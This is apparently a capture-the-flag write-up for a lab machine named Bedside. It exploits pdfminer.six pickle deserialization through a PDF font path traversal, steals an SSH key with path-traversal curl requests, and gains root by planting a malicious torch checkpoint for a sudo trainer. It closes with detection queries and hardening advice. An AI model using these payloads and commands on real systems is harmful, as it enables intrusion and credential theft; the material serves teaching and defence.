# Bedside

```
Difficulty: Medium
Operating System: Linux
Services: HTTP (research.bedside.htb - file upload), internal worker/container, SSH
```

## Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
| :---: | :--------------------------- | :-------------------------------------- | :---------------------------------------------------------------------------------- |
| 1 | Unauthenticated | **File upload recon** | Identified an upload endpoint on `research.bedside.htb` accepting PDFs and model artifacts. |
| 2 | Unauthenticated | **PDF font `/Encoding` path traversal** | Crafted a PDF whose font `/Encoding` name resolves (via `/`->`#2F` escaping) to an uploaded pickle blob's path. |
| 3 | Unauthenticated -> mirth-equivalent worker | **Insecure `pickle` deserialization** | Worker process resolved the traversal path and deserialized the referenced pickle, executing `os.system()` via `__reduce__`. |
| 4 | datawrangler | **Reverse shell catch** | Gained interactive command execution as the `datawrangler` service account. |
| 5 | datawrangler | **Internal LFI via loopback service** | Used an internal-only service on `127.0.0.1:3000` with path traversal to read `developer`'s SSH private key. |
| 6 | developer | **SSH pivot** | Authenticated over SSH as `developer` using the recovered Ed25519 key; retrieved `user.txt`. |
| 7 | developer | **Malicious ML checkpoint planting** | Dropped a second pickle payload as a fake "checkpoint" file in a shared `/datastore/` volume writable by `datawrangler`. |
| 8 | Root | **Insecure checkpoint deserialization via `sudo` trainer** | Triggered `sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py`, which loads the newest checkpoint with `pickle.load` as root, appending `developer`'s key to `/root/.ssh/authorized_keys`. |
| 9 | Root | **Direct SSH as root** | Authenticated as `root` with the same key; retrieved `root.txt`. |

# Offensive Operations

## Recon

Full‑TCP scan (the VPN is high‑latency and lossy, so use `-Pn`, retries, and a modest rate):

```bash
nmap -p- --min-rate 1500 -Pn -sT --max-retries 3 -oN nmap_results.txt 10.129.14.113
nmap -sCV -p22,80,3000 -Pn -oN services.txt 10.129.14.113
```

```
22/tcp   open     ssh      OpenSSH 10.0p2 Debian 7+deb13u4 (Debian 13 "trixie")
80/tcp   open     http     Apache/2.4.68 (Debian)  -> redirects to http://bedside.htb
3000/tcp filtered ppp
```

Port 80 redirects to `bedside.htb`, so add the host and fuzz for vhosts:

/home/z0n/z0n/z0n/posts/Beside/htb_beside_web.png


```bash
echo "10.129.14.113 bedside.htb research.bedside.htb" | sudo tee -a /etc/hosts
ffuf -u http://bedside.htb/ -H "Host: FUZZ.bedside.htb" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -fs <size-of-default-response>
# -> research.bedside.htb
```

/home/z0n/z0n/z0n/posts/Beside/htb_beside_dom_sub.png

`bedside.htb` is a static "clinic" site. **`research.bedside.htb`** is the interesting one - a **file‑upload portal** whose response header advertises the tech:


/home/z0n/z0n/z0n/posts/Beside/htb_beside_researchweb.png


```
X-Powered-By: pdfminer.six
```

The page accepts `jpeg, jpg, png, bmp, tiff, dcm, pdf` **and archives** ("Collections can be uploaded as archives"), and notes that "certain file formats may be converted to standardized formats before being used for AI training."



## Foothold - CVE‑2025‑64512 (pdfminer.six pickle deserialization)

### The vulnerability

`pdfminer.six` (≤ `20250506`, fixed in `20251230`) loads CJK CMap tables from `*.pickle.gz` files with **`pickle`**. In `pdfminer/cmapdb.py`:

```python
@classmethod
def _load_data(cls, name):
    name = name.replace("\0", "")
    filename = "%s.pickle.gz" % name
    cmap_paths = (os.environ.get("CMAP_PATH", "/usr/share/pdfminer/"),
                  os.path.join(os.path.dirname(__file__), "cmap"))
    for directory in cmap_paths:
        path = os.path.join(directory, filename)          # <-- name is attacker controlled
        if os.path.exists(path):
            gzfile = gzip.open(path)
            return type(str(name), (), pickle.loads(gzfile.read()))   # <-- RCE
    raise CMapDB.CMapNotFound(name)
```

```
cat > create_pdf.py << 'EOF'
pdf_content = """%PDF-1.4
1 0 obj

/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj

/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj

/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources 
/Font 
/F1 5 0 R
>>
>>
>>
endobj
4 0 obj

/Length 44
>>
stream
BT
/F1 12 Tf
100 700 Td
(Trigger PDF) Tj
ET
endstream
endobj
5 0 obj

/Type /Font
/Subtype /Type0
/BaseFont /MaliciousFont-Identity-H
/Encoding /#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fevil
/DescendantFonts [6 0 R]
>>
endobj
6 0 obj

/Type /Font
/Subtype /CIDFontType2
/BaseFont /MaliciousFont
/CIDSystemInfo 
/Registry (Adobe)
/Ordering (Identity)
/Supplement 0
>>
/FontDescriptor 7 0 R
>>
endobj
7 0 obj

/Type /Font
/FontName /MaliciousFont
/Flags 4
/FontBBox [-1000 -1000 1000 1000]
/ItalicAngle 0
/Ascent 1000
/Descent -200
/CapHeight 800
/StemV 80
>>
endobj
xref
0 8
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000274 00000 n
0000000370 00000 n
0000000503 00000 n
0000000673 00000 n
trailer 
/Size 8
/Root 1 0 R
>>
startxref
871
%%EOF
"""
with open('trigger.pdf', 'w') as f:
    f.write(pdf_content)
print("Created trigger.pdf")
EOF

python3 create_pdf.py
```

Two properties make this trivially weaponizable:

* The CMap **`name` comes straight from a PDF's font `/Encoding`** and is only stripped of null bytes. Slashes survive (`#2F` in a PDF name decodes back to `/`).
* `os.path.join(base, name + ".pickle.gz")` - if `name` is an **absolute path**, `os.path.join` discards `base`. So a CMap name of `/abs/path/evil` loads **`/abs/path/evil.pickle.gz`** from anywhere on disk.

A PDF with a `Type0` font whose `/Encoding` is an absolute path is enough to make pdfminer `pickle.loads()` a file we control.

### Delivering the pickle to a known path

Uploaded files are stored **and web‑served**:

```
GET /uploads/test.pdf   -> 200      (files land in /uploads/<name>)
GET /uploads/           -> 403      (dir exists, listing denied)
```

A raw gzip is accepted as an "archive", so upload the pickle directly and it sits at a **known, on‑disk path**. The absolute path is leaked by a MIME check on a malformed upload:

```
"MIME type mismatch. Unable to upload file to destination /var/www/research.bedside.htb/uploads"
```

So the pickle lands at `/var/www/research.bedside.htb/uploads/evil.pickle.gz`.

### The payload

The malicious pickle uses `__reduce__` to run a command via `os.system`:

```python
class E:
    def __reduce__(self):
        return (os.system, ("<reverse shell / commands>",))
open("evil.pickle.gz","wb")   # gzip-compressed pickle.dumps(E())
```

The trigger PDF references the pickle by absolute path (slashes as `#2F`):

```
4 0 obj
<< /Type /Font /Subtype /Type0 /BaseFont /Arial
   /Encoding /#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fevil
   /DescendantFonts [5 0 R] >>
endobj
```

Upload `evil.pickle.gz`, then the PDF. A background worker picks it up.

/home/z0n/z0n/z0n/posts/Beside/htb_beside_upload_evil.png



### What actually runs it

Foothold lands as **`datawrangler`** on host `data-wrangler`. The processor is `/app/pdf_watcher.py`:

```python
UPLOAD_DIR = "/var/www/research.bedside.htb/uploads"
while True:
    for pdf in glob.glob(os.path.join(UPLOAD_DIR, "*.pdf")):
        subprocess.run(["pdf2txt.py", pdf, "-o", f"/datastore/staging/{uuid4()}.txt"],
                       timeout=10, check=True)
    time.sleep(30)
```

`pdf2txt.py` extracts text -> instantiates the `Type0` font -> `CMapDB.get_cmap(<abs path>)` -> `pickle.loads()` -> **code execution**. (Callback timing: the watcher polls every 30 s.)

> **Debugging note:** outbound egress is *not* blocked here - an early reverse shell "failing" was simply because the pickle wasn't yet at the path the PDF referenced. Once the pickle is at a known absolute path, both reverse shells and HTTP callbacks fire.



## Container enumeration

`datawrangler` is a minimal container, but two things stand out:

* **Host networking** - `hostname -I` shows the host's address plus the Docker bridge (`172.17.0.1`), so `127.0.0.1:<port>` reaches host services. Listeners: **22, 80, 3000, 45555**.
* **`/datastore`** is a shared mount (same inode on host and container) used by the "AI training" pipeline (`staging -> processed -> model`).

Port **3000** (filtered externally) is reachable here - a JavaScript "Image Viewer" served by **`esm.sh serve .`**:

```
/usr/bin/esm.sh serve .        (from /proc/self/cmdline via the bug below)
USER=developer  HOME=/home/developer   (from /proc/self/environ)
Uid: 1000                              (running on the HOST as developer)
```



## User - arbitrary file read on port 3000

The `esm.sh` dev server serves local files and is vulnerable to **URL‑encoded path traversal** (`..%2f`). Because it runs **on the host as `developer`**, it reads any file `developer` can:

```bash
# from the datawrangler shell (host-networked):
T='..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f'
curl -s "http://127.0.0.1:3000/${T}etc/passwd"                      # host passwd
curl -s "http://127.0.0.1:3000/${T}home/developer/user.txt"         # USER FLAG
curl -s "http://127.0.0.1:3000/${T}home/developer/.ssh/id_ed25519"  # SSH key
```

/home/z0n/z0n/z0n/posts/Beside/htb_beside_trigger_dev_kept.png


The `/etc/passwd` read confirms the real user `developer:x:1000:1000:...:/home/developer:/bin/bash`, and the private key matches `authorized_keys`. SSH straight in:

```bash
ssh -i developer_key developer@10.129.14.113     # user owned
```

/home/z0n/z0n/z0n/posts/Beside/htb_beside_usr_flag.png


## Root - MONAI `CheckpointLoader` -> `torch.load` pickle RCE

`sudo -l` as `developer`:


/home/z0n/z0n/z0n/posts/Beside/htb_beside_sudo.png


```
User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

`/opt/trainer/bedside_trainer.py` (run as **root**) loads the newest checkpoint from `/datastore/checkpoints`:

```python
latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)          # newest *.pt by mtime
if latest_ckpt:
    loader = CheckpointLoader(load_path=str(latest_ckpt),
                              load_dict={"model": model, "optimizer": optimizer},
                              map_location=DEVICE)
    loader(engine)                                            # -> torch.load(...)
```

MONAI 1.5.0's handler does the dangerous thing explicitly:

```python
# monai/handlers/checkpoint_loader.py
checkpoint = torch.load(self.load_path, map_location=self.map_location, weights_only=False)
```

`weights_only=False` = **unrestricted pickle**. Even a *raw* pickle works: `torch.load` falls back to `_legacy_load`, whose very first line is `magic_number = pickle_module.load(f)` - our `__reduce__` fires there (the later "Invalid magic number" error is *after* our code has already run).

### Reaching and triggering it

* `/datastore/checkpoints` is `datawrangler:dataops rwx` - `developer` cannot write it, but **`datawrangler` (our foothold) can**, and `/datastore` is the **same bind mount** the root process reads.
* The loader is only reached after `build_model()` iterates the dataloader, so `/datastore/processed` needs **one valid image**.

So, as `datawrangler`:

```bash
rm -f /datastore/checkpoints/*.pt /datastore/processed/*
printf '<malicious .pt = raw pickle os.system(...)>'  > /datastore/checkpoints/checkpoint_epoch_999.pt
printf '<valid 64x64 png>'                            > /datastore/processed/scan.png
```

Then, as `developer`, run it **with no extra arguments** and detached:

```bash
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py </dev/null >/tmp/tr.log 2>&1 &
```

The root payload injects a key / copies the flag, e.g.:

```bash
cat /home/developer/.ssh/authorized_keys >> /root/.ssh/authorized_keys   # root shell
cat /root/root.txt > /tmp/.rootflag; chmod 644 /tmp/.rootflag            # flag
```

```bash
ssh -i developer_key root@10.129.14.113      # root owned
```

> **Two gotchas that look like failures:**
> * `sudo` **use_pty** + `ssh -tt` + a pipe (`| tail`) deadlocks `sudo`'s I/O relay - the command appears to "hang" at 0% CPU. Run it **detached** (`</dev/null`, output to a file), no `-tt`.
> * The sudoers `Cmnd` is `python3` **with the exact argument** `/opt/trainer/bedside_trainer.py`. Adding `--epochs 1` breaks the match and `sudo` silently asks for a password. Run it **with no extra args**.
> * `/tmp` is `nosuid`, so a SUID‑bash dropped there won't hold root - inject a key or copy the flag instead.


# Defensive Operations

## Strategic Overview

* **1.1 Definition:** Chained exploitation of an insecure PDF-processing pipeline (path traversal into `pickle` deserialization) in a research/ML platform, followed by lateral credential theft and a second deserialization primitive planted in a shared ML-checkpoint directory to achieve root via a `sudo`-permitted training script.
* **1.2 Impact:** Complete System Compromise / Root Access.
* **1.3 The Scenario:** An external, unauthenticated actor uploads a crafted PDF and pickle blob to a public research upload portal. The processing worker's font-resource handling resolves attacker-controlled paths, leading to remote code execution as a low-privilege data-processing account. That account's shared storage access is then abused to plant a second malicious artifact disguised as a model checkpoint, which a privileged training job deserializes as root.

## System Architecture & Theory

* **2.1 Environment:** Linux, Python worker/container, PDF-parsing library, shared `/datastore/` volume, `sudo`-gated ML training script.
* **2.2 Attack Logic Flow:**

> [Public Upload Endpoint] -> [PDF `/Encoding` Path Traversal] -> [`pickle.load()` on Worker] -> [datawrangler RCE] -> [Internal Loopback LFI] -> [developer SSH Key] -> [Malicious Checkpoint Planted in Shared Storage] -> [`sudo` Trainer Deserializes as Root] -> [Root SSH]

* **2.3 Theoretical Analogy:** Slipping a forged claim ticket into a coat-check system that reads the ticket number as a literal shelf location instead of validating it, then later swapping a real archived item for a rigged one that detonates the moment a supervisor with master-key access picks it up for routine inspection.

## Attack Vector

| Attribute | Technical Details |
| :--------------------------------- | :------------------------------------------------------------------------------------------ |
| **Primary Identifiers** | Public file-upload endpoint on `research.bedside.htb`<br>PDF font `/Encoding` resource field<br>Internal loopback service `127.0.0.1:3000`<br>Shared `/datastore/checkpoints/` directory |
| **Critical Vulnerability** | **Path traversal via PDF font resource name** feeding into **unsafe `pickle.load()`**.<br>**Second unsafe deserialization** of ML "checkpoint" files loaded by a `sudo`-privileged trainer with no integrity/signature checks. |
| **Offensive Action** | Deserialization RCE -> internal LFI for SSH key theft -> SSH pivot -> malicious checkpoint injection -> root RCE via privileged trainer |

### Prerequisites

* **Access Level:** Unauthenticated (initial foothold); low-privilege service account write access to shared storage (privesc).
* **Connectivity:** Ingress HTTP to the upload endpoint; loopback access to `127.0.0.1:3000` from the worker context.
* **Target State:** Worker resolves `/Encoding` values as filesystem paths and deserializes referenced files with `pickle`; trainer script loads checkpoints with `pickle.load` under `sudo` without validation.

## Threat Hunting & Anomaly Analysis

* **Hunt Hypothesis:** Adversaries exploiting the upload pipeline will cause the worker process to spawn shell children or open outbound sockets shortly after ingesting a PDF, and will write unusually-named or unusually-timed files into ML checkpoint directories shortly before a scheduled/triggered training run.
* **Behavioral Outliers:** A PDF-processing worker (Python) invoking `os.system`/`subprocess` or opening a raw outbound TCP connection immediately after a file-upload event. A checkpoint file appearing in `/datastore/checkpoints/` with a mtime deliberately set to be "newest," written by a non-training service account.
* **Toxic Combinations:** A public upload surface feeding directly into `pickle.load()`; a shared writable storage volume that is also the trusted input source for a `sudo`-root process.

## Detection Engineering

* **Telemetry Gap Analysis:** Linux Auditd (`execve`), file-integrity monitoring on `/datastore/checkpoints/`, EDR process-creation events for the worker and trainer processes, network connection logs for outbound shells from the worker container.
* **Detection-as-Code (KQL):**

```kql
// Detect the PDF-processing worker spawning a shell shortly after handling an upload
DeviceProcessEvents
| where InitiatingProcessFileName in ("python3", "python")
| where InitiatingProcessCommandLine has_any ("pdf", "worker")
| where FileName in ("bash", "sh")
| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine
```

```kql
// Detect a new/recently-touched checkpoint file immediately preceding a sudo trainer invocation
DeviceFileEvents
| where FolderPath has "/datastore/checkpoints/"
| where ActionType == "FileCreated" or ActionType == "FileModified"
| join kind=inner (
    DeviceProcessEvents
    | where ProcessCommandLine has "bedside_trainer.py" and InitiatingProcessCommandLine has "sudo"
) on DeviceName
| where abs(datetime_diff('second', Timestamp, Timestamp1)) < 60
```

* **Resilience Test:** An adversary could rename the malicious checkpoint to mimic a legitimate naming convention or forge realistic mtimes across a wider time range, evading a narrow "newest file" heuristic.
* **Sub-Rule:** Alert on any `pickle.load`/`torch.load` call (via library instrumentation or strace) against a file not written by the expected training pipeline user/service account.

## Toolkit & Implementation

* **Automation:** Custom Python exploit script - PDF/pickle generator, upload client (`requests`), reverse-shell listener (`socket`/`threading`), SSH pivot (`paramiko`), interactive TTY shell (`termios`/`tty`/`select`).
* **OPSEC Analysis:** Reusing the initial `datawrangler` shell to plant the checkpoint (rather than a separate upload) minimizes additional network requests and avoids a second pass through the upload-triggered PDF pipeline. Setting the checkpoint's mtime via `os.utime` ensures it's selected as "latest" without needing to delete legitimate checkpoints, reducing footprint.
* **Post-Exploitation:** SSH key theft converted directly into a persistent, reusable pivot; both flags retrieved non-interactively before dropping into an interactive root TTY.

## Defensive Mitigation

* **Technical Hardening:**
  1. Replace `pickle` for any untrusted or semi-trusted input (uploads, shared storage, checkpoints) with a non-executable serialization format (JSON, protobuf, `safetensors`).
  2. Canonicalize and constrain all filesystem paths derived from PDF metadata or other user-controlled resource names; reject any path resolving outside an allow-listed directory.
  3. Isolate the upload-processing worker from credential material (SSH keys, internal APIs) and from write access to any directory consumed by privileged jobs.
  4. Require signed/checksummed checkpoints before the `sudo` trainer will load them, and run the trainer as a scoped service account instead of root.
* **Personnel Focus:** Train ML/data engineering teams that "internal-only" storage shared between a low-privilege data worker and a privileged training job is a privilege boundary, not just a convenience - checkpoint provenance must be verified, not assumed.

## Quick Action Playbook

| Step | Objective | Technical Command / Logic |
| :----: | :------------------------------------ | :---------------------------------------------------------------------------------------------- |
| **01** | **Trigger deserialization RCE** | Upload `evil.pickle.gz` + `trigger.pdf` with `/Encoding` pointing at the pickle's path |
| **02** | **Steal SSH key via internal LFI** | `curl http://127.0.0.1:3000/..%2f..%2f.../home/developer/.ssh/id_ed25519` |
| **03** | **Escalate via checkpoint** | `pickle.dump(Exploit(), open('/datastore/checkpoints/checkpoint_epoch_999.pt','wb'))` then `sudo python3 /opt/trainer/bedside_trainer.py` |
